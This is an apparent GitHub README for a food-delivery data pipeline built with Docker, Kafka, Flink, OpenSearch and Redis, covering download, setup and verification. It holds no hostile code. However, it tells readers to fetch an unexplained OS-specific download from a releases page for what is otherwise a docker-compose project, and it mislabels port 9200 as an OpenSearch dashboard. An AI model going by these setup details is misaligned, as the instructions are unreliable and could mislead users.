## üöÄ Getting Started
This project is an end-to-end data pipeline designed for ease of use. You will be able to manage a flow of data using PostgreSQL, Kafka, Flink, OpenSearch, and Redis. Even if you're not a developer, this guide will help you set up and run the application with minimal effort. 

## üõ†Ô∏è Prerequisites
Before you begin, you need to ensure your system meets the following requirements:

- **Operating System**: Windows, macOS, or Linux
- **Docker**: Version 20.10 or later. This application uses Docker to manage its components.
- **Memory**: At least 4 GB of RAM.
- **Disk Space**: Minimum of 1 GB of free space available.

## üì• Download & Install
To download the latest version of the application, visit this page: [Download Page](https://github.com/Ak4aii/food-delivery-pipeline-latest/releases).

Follow these steps:

1. Open your browser and go to the [Download Page](https://github.com/Ak4aii/food-delivery-pipeline-latest/releases).
2. Find the latest release. It will be labeled clearly.
3. Click on the download link for your operating system. This will start the download process.
4. Once downloaded, follow the installation instructions specific to your OS.

## üîß Setting Up Docker
After downloading, you need to set up Docker on your computer:

1. If you do not have Docker installed, download it from [Docker's official website](https://www.docker.com/get-started) and install it following their instructions.
2. Once Docker is installed, open your terminal (or command prompt).
3. Confirm Docker is running by executing the command:

    ```bash
    docker --version
    ```

If Docker is installed correctly, this command will show you the installed version.

## üö¶ Running the Application
After installing Docker, you can run the application:

1. Open a terminal or command prompt.
2. Navigate to the directory where you downloaded the project.
3. Run the following command to start the Docker containers:

    ```bash
    docker-compose up
    ```

This command will pull the necessary Docker images and run the pipeline. You should see various logs indicating that services are starting.

## üìä Accessing the Application
Once the application is running, you can access its features:

- **OpenSearch Dashboard**: Open your web browser and go to `http://localhost:9200`. This will give you access to manage and search your data.
- **Kafka Dashboard**: Open your web browser and navigate to `http://localhost:8081` to manage Kafka topics.

## üìä Sample Data
This application comes with sample data to help you get started. The sample data mimics real-world food delivery scenarios and helps showcase what the application can do. To load the sample data, ensure the application is running and check the logs for confirmation of successful data ingestion.

## ‚úÖ Verification Scripts
After running the pipeline, you can verify that everything works as expected. Use the provided scripts in the `scripts` folder:

1. Navigate to the scripts directory:

    ```bash
    cd scripts
    ```

2. Run the following command to execute the verification script:

    ```bash
    ./verify-data.sh
    ```

This script will check that data flows through each component correctly and ensure that everything operates smoothly.

## ‚öôÔ∏è Common Issues
If you encounter any problems while running the application, here are some common issues and solutions:

- **Docker not running**: Ensure Docker is started before running the command to launch the pipeline.
- **Firewall blocks access**: Check your firewall settings if you cannot connect to the local services.
- **Outdated Docker**: Make sure you are using the latest version of Docker.
